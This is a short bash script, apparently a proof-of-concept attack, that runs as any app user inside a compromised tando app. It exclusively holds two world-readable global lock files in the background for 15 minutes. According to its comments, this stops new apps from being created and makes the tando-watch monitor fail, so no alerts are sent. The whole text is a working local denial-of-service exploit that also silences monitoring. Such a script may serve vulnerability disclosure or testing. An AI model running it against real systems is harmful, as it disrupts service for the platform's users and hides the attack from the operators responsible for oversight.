#!/bin/bash
# lock-dos.sh: run INSIDE a compromised app (any tando app user). The global lock files are
# 0644, and flock(2) works on a read-only descriptor, so any local user can hold them:
#   /opt/tando/.ports.lock   -> tando-agent configure waits on `flock 8` forever: no new app can be created
#   /var/lib/tando/watch/lock -> tando-watch run fails after 30 s, every minute: no alert is sent
for f in /opt/tando/.ports.lock /var/lib/tando/watch/lock; do
  [ -e "$f" ] && nohup setsid flock -x "$f" sleep 900 > /dev/null 2>&1 < /dev/null &
done
